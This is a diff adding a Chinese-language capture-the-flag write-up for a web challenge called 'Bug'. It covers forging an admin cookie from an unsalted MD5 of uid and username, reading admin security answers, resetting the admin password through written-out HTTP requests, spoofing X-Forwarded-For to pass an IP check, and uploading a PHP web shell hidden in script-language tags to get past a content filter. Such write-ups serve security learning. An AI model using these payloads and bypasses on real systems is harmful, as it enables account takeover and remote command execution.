@@ -1342,3 +1342,108 @@ flag{bdaf96f6f3403be1720938ef20ccac34}
 <h1>Welcome, blake! flag{12312}</h1>
 ```
 
+### 03. Bug
+
+#### 初步分析
+
+尝试注册并登录用户名 test1, 服务端 Set-Cookie 里有个 user=d8719248cce803487ad7fa7c2ac03b3b，一眼 MD5。但直接 md5("test1")、md5("5")、md5("111")、md5("admin")… 全不匹配，说明不是单字段。 
+
+随后注册多个用户，让字段交叉变化：
+
+| username | password | uid |
+| --- | --- | --- |
+| aa1 | 111 | 7 |
+| aa2 | 111 | 8 |
+| aa3 | 222 | 9 |
+
+密码相同但 cookie 不同 => cookie 不依赖密码，依赖 username/uid。
+
+因此该 Cookie 可伪造。
+
+#### 伪造 Admin Cookie
+
+这个 Cookie 只由 uid 和 username 决定，不含任何服务端密钥/随机数，而 admin 的 uid=1、username=admin 都能猜到！所以可直接算出 admin 的 cookie！！
+
+```python
+cookie=md5(1:admin)
+```
+
+#### 越权读 admin 密保
+
+同一会滑下，`member` 页的权限判断跟 cookie 走（不跟 session）。用普通用户 session + 伪造 `user=MD5("1:admin")` 访问 `do=member&uid=1`，即可越权读取 admin 资料：
+
+```
+UID: 1   Username: admin   Birthday: 1993/01/01   Address: 福建省福州市闽侯县
+```
+
+> 什么？我的 Address 也是福建。
+
+但似乎只有 `member` 跟 **cookie** 走。其他页面则跟 **session** 走。不过我们已经拿到了 admin 的密保信息，改他密码不是轻轻松松？
+
+#### findpwd 越权重置 Admin 密码
+
+Step1:
+
+```http
+POST /index.php?module=findpwd&step=1&doSubmit=yes
+username=admin&birthday=1993/01/01&address=福建省福州市闽侯县
+```
+
+=> `Yes,You are admin`
+
+Step2:
+
+```http
+POST /index.php?module=findpwd&step=2&doSubmit=yes
+Referer: http://<host>/index.php?module=findpwd&step=1&doSubmit=yes
+username=admin&newpwd=111111
+```
+
+#### 登录 Admin 并伪造 IP
+
+用重置的密码登录 admin。
+
+`Manage`（`module=admin`）有 IP 限制（`IP Not allowed`），加 `X-Forwarded-For: 127.0.0.1` 及 `Client-IP` 绕过。
+
+页面返回 `Where Is The Flag?` 并给出源码提示：
+
+```html
+<!-- index.php?module=filemanage&do=???-->
+```
+
+#### 上传绕过获取 Flag
+
+猜测 `do=upload`, 得到上传页`Just image?`:
+
+```html
+<form enctype='multipart/form-data' method='post' action="index.php?module=filemanage&do=upload">
+    <input name='upfile' type='file' />
+```
+
+逐次上传：
+- 传空/普通文件: You know what I want!
+- 传 .php 一句话: Something shows it is a php!
+- 改后缀: 发现是内容在查 <?，而非只看后缀。
+
+但是 PHP 5.5 在开 asp_tags 时，支持
+
+```php
+<script language="php">…</script> 
+```
+
+作为开标签且该服务端未检测本 case。
+
+遂构造一句话木马载荷:
+
+```
+Content-Disposition: form-data; name="upfile"; filename="shell.php5"
+Content-Type: image/jpeg
+
+<script language="php">system($_GET["c"]);</script>
+```
+
+上传成功服务端直接返回 flag：
+
+```
+alert('you have get points,here is the flag:flag{Xry8GI384a6ANEyeJJACDeNj31ZwhMfh3riDIirG}');
+```
